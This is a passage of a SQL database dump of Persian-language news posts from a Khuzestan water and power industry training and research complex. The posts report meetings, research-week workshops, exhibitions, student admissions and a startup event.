	<span dir="RTL">روز یکشنبه مورخ 12 آذر ماه، جلسه تصمیم گیری در خصوص نحوه برگزاری ارزیابی صلاحیت حرفه ای مشاغل استاندارد شرکت های زیر مجموعه شرکت مادر تخصصی توانیر در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</span></p>', '<p dir="RTL" style="margin-right: 0.6pt; text-align: justify;">
	در روز یکشنبه مورخ 12 آذر ماه، جلسه تصمیم گیری در خصوص نحوه برگزاری ارزیابی صلاحیت حرفه ای مشاغل استاندارد شرکت های زیر مجموعه شرکت مادر تخصصی توانیر در استان خوزستان با حضور نماینده شرکت توانیر، معاونین شرکت برق منطقه ای و شرکت توزیع برق خوزستان و شرکت توزیع برق اهواز و کارشناسان مربوطه در محل سالن جلسات مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p dir="RTL" style="margin-right: 0.6pt; text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="margin-right: 0.6pt; text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_127.jpeg" /></p>
<p dir="RTL" style="margin-right: 0.6pt; text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="margin-right: 0.6pt; text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_128.jpeg" /></p>
<p>
	&nbsp;</p>', '59215Picture.jpg', 210, '1402/9/14', '4:09:48 PM', 1402, 'آذر', 9, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59216, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری مراسم گرامیداشت روز دانشجو و آئین استقبال از دانشجویان جدیدالورد', '<p style="text-align: justify;">
	<span dir="RTL">مراسم گرامیداشت روز دانشجو روز یکشنبه مورخ ۱۴۰۲/۰۹/۱۲ در سالن همایش های مجتمع آب و برق و با حضور ریاست محترم واحد استانی دانشگاه جامع جناب آقای دکتر بهرهی، ریاست محترم مجتمع، معاونین، مدیران، مشاورین، اساتید و دانشجویان مرکز برگزار گردید.</span></p>', '<p dir="RTL" style="text-align: justify;">
	مراسم گرامیداشت روز دانشجو روز یکشنبه مورخ ۱۴۰۲/۰۹/۱۲ در سالن همایش های مجتمع آب و برق و با حضور ریاست محترم واحد استانی دانشگاه جامع جناب آقای دکتر بهرهی، ریاست محترم مجتمع، معاونین، مدیران، مشاورین، اساتید و دانشجویان مرکز برگزار گردید. در این مراسم که بدلیل تلاقی با ایام فاطمیه در فضایی معنوی برگزار گردید، جناب آقای دکتر هودگر ریاست مجتمع و جناب آقای دکتر عرب زاده سرپرست معاونت آموزشی و پژوهشی ضمن خوش آمد به میهمانان، فلسفه وجودی روز دانشجو، نقش دانشجو، رویکرد و اهداف مجتمع با تاکید بر لزوم فعال نمودن تشکل ها. کانون ها و انجمن های علمی را به عنوان یک مرکز آموزشی و پژوهشی تبیین نمودند. در ادامه قوانین و مقررات آموزشی جهت دانشجویان توسط گروه آموزشی بلند مدت ارائه گردید. پخش کلیپ، روضه خوانی به مناسبت ایام فاطمیه، برگزاری پرسش و پاسخ، اهدا کتاب به میهمانان و پذیرایی از دیگر برنامه های این مراسم بود.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="1" cellspacing="5" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_129.jpeg" /></td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_130.jpeg" /></td>
			<td style="text-align: center; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_131.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_132.jpeg" /></td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_133.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '59216Main.jpg', 408, '1402/9/14', '4:17:30 PM', 1402, 'آذر', 9, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59217, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پیام ریاست محترم مجتمع درخصوص گرامیداشت هفته پژوهش', '<p dir="RTL" style="text-align: justify;">
	پژوهش به عنوان اساسی&shy; ترین ارکان رشد و پیشرفت هر کشور، زمینه ساز بزرگترین تحولات، توسعه پایدار و جهش علمی آن کشور به شمار می رود. فرهنگ تحقیق و پژوهش در هر جامعه &shy;ای موجب پویایی و نشاط آن جامعه شده و مانع ایجاد سکون و رکورد در آموزش می&shy; گردد.&nbsp;</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: center;">
	<span style="font-size:16px;"><strong>پژوهش و فناوری، پیشران رشد تولید و مهار تورم</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	پژوهش به عنوان اساسی &shy;ترین ارکان رشد و پیشرفت هر کشور، زمینه ساز بزرگترین تحولات، توسعه پایدار و جهش علمی آن کشور به شمار می رود. فرهنگ تحقیق و پژوهش در هر جامعه&shy; ای موجب پویایی و نشاط آن جامعه شده و مانع ایجاد سکون و رکورد در آموزش می &shy;گردد. &nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	هفته&shy; ی پژوهش امکان ایجاد فضای تعاملی برای آشنایی ذینفعان حال و آینده با واحدهای پژوهش و فناوری را فراهم می نماید. معرفی عملکرد مطالعاتی و تحقیقاتی مؤسسات پژوهشی و عرضه دستاوردهای آنها سبب افزایش حساسیت و توجه مدیران به اهمیت این حوزه شده و زمینه تجاری&zwnj;سازی یافته&zwnj;های پژوهشی و فناوری&zwnj;های توسعه&zwnj; یافته را فراهم می نماید. به دلیل اهمیت این امر، در ایران عزیزمان هفته ای تحت عنوان &quot; هفته &shy;ی پژوهش و فناوری &quot; نام&shy;گذاری شده است.</p>
<p dir="RTL" style="text-align: justify;">
	نقش و اهمیت پژوهش در عرصه اندیشه، در ابعاد مختلف حیات امروز بشر بارها بررسی و تأکید گردیده؛ به ویژه با ابتکار مقام معظم رهبری در طرح نظریه جنبش نرم افزاری، ضرورت توجه به آن بیشتر تبیین و تشریح شده است<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	اینجانب به مناسبت هفته ی پژوهش زحمات تلاشگران سنگر علم و پژوهشگران جوان و مجرب در پیشبرد اهداف متعالی ایران اسلامی را ارج می نهم و توفیق روزافزون آنها در عرصه پژوهش و فناوری را از درگاه خداوند متعال طلب دارم<span dir="LTR">.</span></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_134.jpeg" /></p>
', '59217Research.jpg', 237, '1402/9/14', '4:25:32 PM', 1402, 'آذر', 9, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59218, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری مراسم بزرگداشت هفته پژوهش و فناوری در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p style="text-align: justify;">
	مراسم افتتاحیه بزرگداشت هفته پژوهش و فناوری روز سه شنبه مورخ 14 آذر در مجتمع آب و برق و با حضور ریاست محترم مجتمع، معاونین، مشاورین، مدیران، اساتید و دانشجویان مرکز برگزار گردید.</p>
', '<p style="text-align: justify;">
	مراسم افتتاحیه بزرگداشت هفته پژوهش و فناوری روز سه شنبه مورخ 14 آذر در مجتمع آب و برق و با حضور ریاست محترم مجتمع، معاونین، مشاورین، مدیران، اساتید و دانشجویان مرکز برگزار گردید. در این مراسم جناب آقای دکتر هودگر ریاست محترم مجتمع ضمن تبریک این هفته و بیان برنامه های مجتمع در هفته مذکور و همچنین اعلام شرکت مجتمع در نمایشگاه های تهران و اهواز به همین مناسبت، اهمیت مقوله پژوهش و برنامه های جدید جهت نقش آفرینی بیشتر&nbsp; مجتمع در این عرصه را بیان فرمودند. سپس جناب آقای دکتر عرب زاده معاونت محترم آموزشی و پژوهشی مجتمع ضمن تبریک هفته پژوهش و فناوری، تاریخچه و فلسفه نامگذاری این هفته را جهت حضار ارائه نمودند. در ادامه نیز یک کارگاه ((آشنائی با بوم کسب و کار)) توسط آقای دکتر هودگر ریاست مجتمع جهت شرکت کنندگان در جلسه ارائه گردید. برگزاری کارگاه و سمینارهای مختلف و همچنین برگزاری مسابقه جهت دانشجویان مجتمع از دیگر برنامه های هفته پژوهش و فناوری در مجتمع آب و برق خوزستان می باشد.</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_135.jpeg" /></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_136.jpeg" /></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_137.jpeg" /></p>
', '59218P1.jpg', 173, '1402/9/16', '12:43:14 PM', 1402, 'آذر', 9, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59219, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری کارگاه سخنوری', '<p style="text-align: justify;">
	<span dir="RTL">به مناسبت هفته پژوهش و روز دانشجو کارگاه هنر بیان و سخنوری با تدریس دکتر کیوان&nbsp; لطفی (گوینده و مجری صدا و سیما، مدرس دانشگاه و مترجم کتاب قدرت سخنوری) </span><span dir="RTL">به صورت حضوری و در سالن همایش های مجتمع برگزار گردید. </span></p>
', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع آموزشی و پژوهشی صنعت آب و برق خوزستان؛ به مناسبت هفته پژوهش و روز دانشجو کارگاه هنر بیان و سخنوری با تدریس دکتر کیوان&nbsp; لطفی (گوینده و مجری صدا و سیما، مدرس دانشگاه و مترجم کتاب قدرت سخنوری) به همت معاونت آموزشی و پژوهشی و همکاری روابط&zwnj;عمومی و دفتر پژوهش و فناوری مجتمع عالی آموزشی صنعت آب و برق خوزستان به صورت حضوری و در سالن همایش های مجتمع برگزار گردید. این کارگاه با استقبال دانشجویان و اساتید و نیز پرسنل مجتمع آموزشی و پژوهشی&nbsp; همراه با صدور گواهی معتبر و رایگان طبق تقویم هفته پژوهش روبه رو شد که در پایان&nbsp; نیز کتابی به رسم احترام و تکریم توسط سخنران محترم به یکی از اساتید پیشکسوت و با سابقه بهمراه امضا تقدیم گردید.</p>
<table align="center" border="0" cellpadding="5" cellspacing="5" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_138.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_139.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_140.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_141.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_142.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_143.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '59219MainPic.jpg', 261, '1402/9/18', '4:31:30 PM', 1402, 'آذر', 9, '18');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59221, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری کارگاه مقاله نویسی به مناسبت هفته پژوهش', '<p style="text-align: justify;">
	<span dir="RTL">به مناسبت هفته ی پژوهش و روز دانشجو کارگاهی تحت عنوان آموزش مقاله نویسی توسط خانم دکتر صدری صیفی&nbsp; با همت معاونت آموزشی و پژوهشی و همکاری روابط عمومی و همچنین دفتر پژوهش و فناوری به صورت حضوری و رایگان برگزار گردید. </span></p>
', '<p dir="RTL" style="text-align: justify;">
	به مناسبت هفته ی پژوهش و روز دانشجو کارگاهی تحت عنوان آموزش مقاله نویسی توسط خانم دکتر صدری صیفی از نخبگان دانشگاه تهران در روز شنبه مورخ 18 آذر ماه در سالن همایش های مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با همت معاونت آموزشی و پژوهشی و همکاری روابط عمومی و همچنین دفتر پژوهش و فناوری به صورت حضوری و رایگان برگزار گردید. در این کارگاه به بررسی انواع مقالات، روش ها ، آموزش و نکات لازم جهت نوشتن مقالات <span dir="LTR">ISI</span> پرداخته شد.</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_144.jpeg" /></p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_145.jpeg" /></p>
', '59221SPic.jpg', 378, '1402/9/19', '3:23:51 PM', 1402, 'آذر', 9, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59222, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'یکی از بزرگترین نمایشگاه‌ دستاوردهای پژوهش؛ فناوری و فن بازار برگزار گردید', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزش و پژوهشی صنعت آب و برق خوزستان&nbsp; به مناسبت هفته پژوهش و فناوری&nbsp; از برگزاری بیست و چهارمین نمایشگاه دستاوردهای پژوهش، فناوری و فن بازار در مصلی امام خمینی (ره) تهران خبر داد که شعار هفته پژوهش و فناوری با تاکیدات رهبری: پژوهش و فناوری پیشران رشد تولید و مهار تورم نامگذاری شده است.</p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزش و پژوهشی صنعت آب و برق خوزستان&nbsp; به مناسبت هفته پژوهش و فناوری&nbsp; از برگزاری بیست و چهارمین نمایشگاه دستاوردهای پژوهش، فناوری و فن بازار در مصلی امام خمینی (ره) تهران خبر داد که شعار هفته پژوهش و فناوری با تاکیدات رهبری: پژوهش و فناوری پیشران رشد تولید و مهار تورم نامگذاری شده است.</p>
<p dir="RTL" style="text-align: justify;">
	دکتر هودگر ریاست محترم مجتمع در این خصوص عنوان نمود که&nbsp; یکی از مهترین اهداف این نمایشگاه شناسایی نیازهای پژوهشی و فناورانه و برقراری ارتباط سازنده میان بخش عرضه و تقاضای فناوری کشور است که مجتمع عالی آموزشی و پژوهشی نیز همگام و دوشادوش وزارت نیرو و نیز&nbsp; سازمان آب و برق خوزستان مشارکت فعال داشته است و در حاشیه این نمایشگاه با برپایی غرفه و ایجاد فضای تعامل گرایانه با موسسات و مجموعه های فناورانه و پژوهشی مذاکرات و نشست های نیز برقرار نموده است.</p>
<p dir="RTL" style="text-align: justify;">
	گفتنی است زمان برگزاری هفته پژوهش و فناوری ملی از ۱۹ تا ۲۵ آذر ۱۴۰۲ در شهر تهران منعقد گردیده بود.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_146.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_147.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_148.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 300px; height: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; height: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px; height: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; height: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px; height: 5px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_149.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_150.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_151.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 300px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td colspan="3" rowspan="1" style="text-align: center; vertical-align: middle;">
				<img alt="" src="wp-content/uploads/news-images/image_152.jpeg" /></td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle;">
				&nbsp;</td>
		</tr>
	</tbody>
</table>
<p>
	<br />
	<br />
	&nbsp;</p>
<p>
	&nbsp;</p>', '59222SMain.jpg', 419, '1402/9/25', '3:28:31 PM', 1402, 'آذر', 9, '25');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59223, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'حضور فعال مجتمع عالی آموزشی و پژوهشی آب و برق خوزستان در نمایشگاه هفته پژوهش', '<p style="text-align: justify;">
	<strong><span dir="RTL">بیست و چهارمین نمایشگاه دستاوردهای پژوهش و فناوری و یازدهمین فن بازار استان خوزستان با هدف ارائه آخرین دستاوردها و عرضه محصولات فناورانه برگزار گردید. در این نمایشگاه، ادارات، سازمان ها، شرکت ها، دانشگاه ها و مراکز آموزش عالی استان خوزستان در محل دائمی نمایشگاه های استان خوزستان در سالن خرمشهر شرکت نمودند. </span></strong></p>
', '<p dir="RTL" style="text-align: justify;">
	<strong>بیست و چهارمین نمایشگاه دستاوردهای پژوهش و فناوری و یازدهمین فن بازار استان خوزستان با هدف ارائه آخرین دستاوردها و عرضه محصولات فناورانه برگزار گردید. در این نمایشگاه، ادارات، سازمان ها، شرکت ها، دانشگاه ها و مراکز آموزش عالی استان خوزستان در محل دائمی نمایشگاه های استان خوزستان در سالن خرمشهر شرکت نمودند. </strong></p>
<p dir="RTL" style="text-align: justify;">
	<strong>دکتر هودگر ریاست مجتمع آب و برق خوزستان در حاشیه این نمایشگاه با بیان اینکه مجتمع با هفت اختراع و دستاورد در حوزه های مختلف فناوری، نوآوری و نمونه اولیه و همچنین در مراحل تولید انبوه در این نمایشگاه شرکت نمود و با معرفی دستاوردهای واحدهای فناور مستقر در مرکز رشد شهدای صنعت آب و برق با پخش کلیپ، ماکت، کتابچه و بروشور، موجبات ثبت قرارداد سرمایه گذاران با مخترعین و انعقاد تفاهم نامه با مراکز علمی و دانشگاه ها را فراهم نموده است. </strong></p>
<p dir="RTL" style="text-align: justify;">
	<strong>وی افزود: استقبال قابل توجه ای از غرفه این مرکز توسط مسولان، واحدهای فناور و خصوصاً دانشجویان شد که در حاشیه این نمایشگاه با برگزاری کارگاه های آموزشی با ارایه گواهینامه رایگان و معتبر نظیر مقاله نویسی، بوم کسب و کار، استارتاپ و چگونگی ثبت اختراع و... توسط معاونت آموزشی و پژوهشی مجتمع &nbsp;با همکاری مرکز رشد شهدای صنعت آب و برق خوزستان را از دیگر برنامه های مجتمع آب و برق در این نمایشگاه بیان فرمودند</strong> <strong>که مورد استقبال و اقبال عموم بازدیدکنندگان قرار گرفت.</strong></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_153.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_154.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_155.jpeg" /></td>
		</tr>
		<tr>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
		<tr>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_156.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_157.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_158.jpeg" /></td>
		</tr>
		<tr>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
		<tr>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_159.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td>
				&nbsp;</td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '59223p0.jpg', 561, '1402/10/5', '3:46:37 PM', 1402, 'دی', 10, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59224, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تقدیر نامه', '<p>
	در حاشیه ششمین نشست روسای مراکز جامع علمی و کاربردی استان خوزستان از آقای دکتر هودگر ریاست مجتمع عالی آموزشی و پژوهشی آب و برق خوزستان به جهت مشارکت و فعالیت موثر&nbsp; مجموعه مرکز آب و برق در برپایی غرفه و ارائه دستاوردها در نمایشگاه دستاوردهای پژوهش فناوری و فن بازار سال ۱۴۰۲&nbsp; تقدیر و تشکر به عمل آمد.</p>', '<table border="1" cellpadding="1" cellspacing="1" style="width: 500px">
	<tbody>
		<tr>
			<td style="width: 900px; height: 1000px;">
				<img alt="" src="wp-content/uploads/news-images/image_160.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '', 289, '1402/11/2', '8:54:26 AM', 1402, 'بهمن', 11, '2');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59225, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور', '<p style="text-align: justify;">
	به اطلاع متقاضیان ثبت&zwnj; نام در پذیرش دوره های کاردانی و کارشناسی ناپیوسته می رساند،&nbsp;زمان ثبت &zwnj;نام در دوره های کاردانی از روز دوشنبه 16 بهمن لغایت پنجشنبه 19 بهمن و ثبت&zwnj; نام در دوره های کارشناسی ناپیوسته از روز شنبه 14 بهمن لغایت چهارشنبه مورخ 18 بهمن می باشد<span dir="LTR">.</span><br />
	لذا داوطلبان واجد شرایط می&zwnj;توانند در مهلت مقرر برای ثبت نام از طریق درگاه اطلاع&zwnj;رسانی سازمان سنجش کشور به نشانی:<span dir="LTR"> www.sanjesh.org </span>اقدام نمایند</p>
', '<p dir="RTL" style="text-align: justify;">
	مرکز آموزش علمی - کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، بهمن ماه سال 1402 در <strong>مقاطع کاردانی و کارشناسی ناپیوسته،</strong> <strong>بدون کنکور</strong> دانشجو می پذیرد. علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های <span dir="LTR">06133340070</span> و 06133340013&nbsp; تماس حاصل نموده و یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; رو به روی هتل نیشکر مراجعه نمایند</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:16px;"><span style="color:#ff0099;"><strong>ثبت نام رشته های کارشناسی ناپیوسته: 16 لغایت 19 بهمن</strong></span></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><span style="color:#ff0099;"><strong>ثبت نام رشته های کاردانی: 14 لغایت 18 بهمن</strong></span></span></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#800080;"><span style="font-size:16px;"><strong>نحوه ثبت نام :</strong></span><br />
	<span style="font-size:16px;"><strong>به صورت حضوری (بلوار گلستان بین خیابان کاشان و همدان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان) و یا از طریق سایت سازمان سنجش به نشانی: (www.sanjesh.org)</strong></span></span></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_161.jpeg" style="height: 1255px; width: 750px;" /></p>
', '59225Freekonkour4022.jpg', 507, '1402/11/16', '7:47:37 PM', 1402, 'بهمن', 11, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59226, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری رویداد استارتاپی در حوزه های آب و برق', '<p dir="RTL">
	به گزارش خبری سازمان آب و برق خوزستان و به نقل از دکتر هودگر :رویدادهای استارتاپی در حوزه آب و برق در دو روز متوالی8 و 9 اسفندماه برگزار گردید، این رویداد با حضور 12 داور برتر در زمینه های تخصصی و حمایت سازمان آب وبرق خوزستان و شرکت هایی چون &quot;شرکت بهره برداری از شبکه های آبیاری کرخه و شاوور، شرکت بهره برداری، تولید و انتقال آب غدیر خوزستان، سازمان علمی پژوهشی سپاه ولی عصر (عج) و نیروگاه رامین&quot; در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p>
	&nbsp;</p>', '<p dir="RTL">
	به گزارش خبری سازمان آب و برق خوزستان و به نقل از دکتر هودگر :رویدادهای استارتاپی در حوزه آب و برق در دو روز متوالی8 و 9 اسفندماه برگزار گردید، این رویداد با حضور 12 داور برتر در زمینه های تخصصی و حمایت سازمان آب وبرق خوزستان و شرکت هایی چون &quot;شرکت بهره برداری از شبکه های آبیاری کرخه و شاوور، شرکت بهره برداری، تولید و انتقال آب غدیر خوزستان، سازمان علمی پژوهشی سپاه ولی عصر (عج) و نیروگاه رامین&quot; در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p dir="RTL">
	ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان عنوان نمود:در اولین روز رویداد با موضوع &quot;مدیریت کیفی منابع آب&quot; 25 ایده اولیه در سامانه ثبت نام کردند، که از میان آن ها 14 ایده برگزیده شد تا در رویداد حضور یابند، که پس از داوری و کسب امتیاز داوران 4 ایده برتر برگزیده شد.</p>
<p dir="RTL">
	در رویداد روز دوم نیز با موضوع &quot;ژنراتورها و موتورها در صنعت برق&quot;10 ایده اولیه در سامانه ثبت نام کردند، که از میان آن ها 6 ایده برای داوری انتخاب گردید، تا در رویداد حضور یابند که پس از داوری و کسب امتیاز 4 ایده برتر برگزیده گردید.</p>
<p dir="RTL">
	وی افزود در اختتامیه رویداد که در 13 اسفندماه در سالن همایش های گیت بوستان برگزار گردید، از حامیان و داروران رویداد تجلیل شد و همچنین از کلیه شرکت کنندگان و برگزیدگان رویداد جوایز نفیس و تقدیر به عمل آمد،شایان ذکر است در روز اختتامیه نیز دکتر بختیاری معاونت پارک علم وفناوری استان خوزستان و یکی از کارآفرینان برتر استان بعنوان سخنران تجربه محور نیز سخنرانی کردند.</p>
<p dir="RTL">
	هودگر برگزاری رویداد&zwnj;های مختلف که منجر به جسارت بیان و به اشتراک گذاشتن ایده&zwnj;ها از سوی افراد صاحب ایده می&zwnj;شود را یکی از راهکار&zwnj;های مهم توسعه و ترویج فرهنگ نوآوری و فناوری در جامعه برشمرد همچنین معاونت پارک علم و فناوری خوزستان برگزاری این نوع رویداد&zwnj;ها را فرصتی مغتنم برای ایجاد ارتباط بین فناوران و شرکت&zwnj;های بزرگ در راستای همکاری&zwnj;های مشترک و انتقال فناوری دانست.</p>
<p dir="RTL">
	در جلسه اختتامیه بیانیه رویداد نیز با شعار افق های جدید و روشن در صنعت آب و برق توسط دبیر رویداد برای حضار قرائت گردید که هدف از انتخاب این شعار را گوشزد کردن ضرورت بهره گیری از تکنولوژی ها و روشهای نوین در صنعت آب و برق عنوان نمود و صنعتگران و ایده پردازان را جهت پیدا نمودن راه حل مشکلات این صنعت و تشویق نمودن آنها برای رفع مشکلات و کاستی های این صنعت در استان و کشور با توان داخلی باشند.</p>
<p>
	&nbsp;</p>', '', 160, '1402/12/15', '12:32:19 PM', 1402, 'اسفند', 12, '15');
